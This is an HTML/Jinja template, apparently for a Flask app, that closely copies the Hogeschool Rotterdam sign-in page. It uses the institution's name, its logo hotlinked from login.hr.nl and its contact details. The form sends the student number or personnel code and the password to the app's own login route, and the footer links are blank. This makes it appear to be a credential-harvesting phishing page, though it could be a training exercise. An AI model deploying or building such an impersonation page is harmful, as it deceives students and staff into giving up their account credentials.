<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>Login Hogeschool Rotterdam</title>
		<link rel="shortcut icon" type="image/x-icon" href="favicon.ico"/>
		<meta name="viewport" content="width=device-width, initial-scale = 1.0"/>
		<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
		<link rel="stylesheet" href="static/site.css"/>
		<link rel="stylesheet" href="static/login.css"/>
		<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600&display=swap" rel="stylesheet"/>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	</head>
	<body class="t-white has--keyboard-focus">
		<div class="c-header header">
			<div class="o-container header__container">
				<div class="header__logo">
					<a class="c-logo" title="Hogeschool Rotterdam" href="/">
						<img class="logo__image" src="https://login.hr.nl/v1/assets/svg/logo/logo.svg" alt="Hogeschool Rotterdam" aria-hidden="true">
					</a>
				</div>
			</div>
		</div>

		<div class="main" id="content" role="main">
			<div class="o-container">
				<h1>Log in</h1>
				<form class="c-form" method="post" action="{{ url_for('login') }}" id="form">
					<div class="u-max-width--sm u-align--center">
						<div class="c-input form__item input--text">
							<div class="input__wrapper">
								<label class="input__label" for="user_number">Student number or personnel code</label>
								<input class="input__input" type="text" name="user_number" value="" id="user_number" required="required" maxlength="12" tabindex="1" autofocus="autofocus" autocomplete="off"/>
								<span class="focus-helper"></span>
							</div>
							<span class="input__error" aria-live="polite"></span>
						</div>

						<div class="c-input form__item input--password">
							<div class="input__wrapper" title="Wachtwoord">
								<label class="input__label" for="password">Password</label>
								<input class="input__input" type="password" name="password" value="" id="password" required="required" maxlength="96" tabindex="2" autocomplete="off"/>
								<span class="focus-helper"></span>
							</div>
							<span class="input__error" aria-live="polite"></span>
						</div>
					</div>
					<div class="u-text--centered">
						<input class="c-button--primary" type="submit" id="button_submit" value="Login">
					</div>
				</form>
				{% if error %}
					<p class="error"><strong>Error:</strong> {{ error }}</p>
				{% endif %}
			</div>
		</div>

		<script>
		</script>


		<div class="c-footer">
			<div class="footer__container">
				<div class="footer__link">
					<a class="footer__item" href="">
						
							
							
								Forgot your password?
							
						
					</a>
				</div>
				<div class="footer__communication">
					<a class="footer__item" href="">010 - 794 1111</a>
					<a class="footer__item" href="">service@hr.nl</a>
				</div>
			</div>
		</div>

	</body>
</html>
